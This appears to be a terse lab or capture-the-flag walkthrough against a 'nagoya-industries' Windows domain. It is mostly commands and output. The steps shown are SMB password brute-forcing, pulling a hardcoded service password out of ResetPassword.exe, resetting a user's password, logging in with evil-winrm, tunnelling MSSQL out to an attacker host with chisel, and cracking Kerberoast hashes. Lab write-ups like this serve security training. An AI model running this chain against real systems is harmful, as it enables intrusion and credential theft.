  

## **Port 80**

**Che**ck **o**n **th**e **we**b **serv**er, **go**t **a** **li**st **o**f **te**am **nam**e, **us**e **th**e **na**me **t**o **cre**ate **a** **user**name **li**st **wi**th **anne.J**enkins **form**at. **Th**en **us**e **crackm**apexec **t**o **bru**te **for**ce **SM**B

  

  

```SQL
rpcclient -U nagoya-industries/svc_helpdesk 192.168.232.21

```

```SQL
 ~ ilspycmd ResetPassword.exe | grep Password
[assembly: AssemblyTitle("ResetPassword")]
[assembly: AssemblyProduct("ResetPassword")]
namespace ResetPassword;
        private static string service_Password = "U299iYRmikYTHDbPbxPoYYfa2j4x4cdg";
                        Console.WriteLine("Usage: PasswordReset.exe <Domain Username> <New Password>");
                PrincipalContext val = new PrincipalContext((ContextType)1, text2, service_username, service_Password);
                        ((AuthenticablePrincipal)val2).SetPassword(password);
                        Console.WriteLine("Password reset successful.");
                        
                        
 gstrings -e l ResetPassword.exe

Usage: PasswordReset.exe <Domain Username> <New Password>
nagoya-industries.com
User not found.
Password reset successful.
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
ResetPassword
FileVersion
1.0.0.0
InternalName
ResetPassword.exe
LegalCopyright
Copyright 
  2023
LegalTrademarks
OriginalFilename
ResetPassword.exe
ProductName
ResetPassword
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
                        
                        
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

```SQL
setuserinfo christopher.lewis 23 'Admin!23'
```

```SQL
evil-winrm  -u christopher.lewis -p 'Admin!23' -i 192.168.232.21
```

> [!important]

```SQL
upload chisel_1.10.0_windows_amd64
```

```SQL
mv chisel_1.10.0_windows_amd64 c:/temp
```

```SQL
cmd.exe /c "C:\Temp\chisel_1.10.0_windows_amd64 client 192.168.45.250:445 R:1433:127.0.0.1:1433"
```

```SQL
mssqlclient.py  svc_mssql:'Service1'@127.0.0.1 -windows-auth
```

```SQL
crackmapexec smb 192.168.232.21 -u ./1.txt -p ./rockyou_utf8.txt | grep -v STATUS_LOGON_FAILURE
```

```SQL
crackmapexec smb 192.168.232.21 -u 1.txt -p rockyou_utf8.txt   | grep -v STATUS_LOGON_FAILURE   
```

john --wordlist=/users/share/wordlists/rockyou.txt kerberoast.txt  
Using default input encoding: UTF-8  
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Service1 (?)  
1g 0:00:00:35 DONE (2024-09-09 21:20) 0.02783g/s 399213p/s 428194c/s 428194C/s 1..*7¡Vamos!  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed  
➜ ~ john --show kerberoast.txt

?:Service1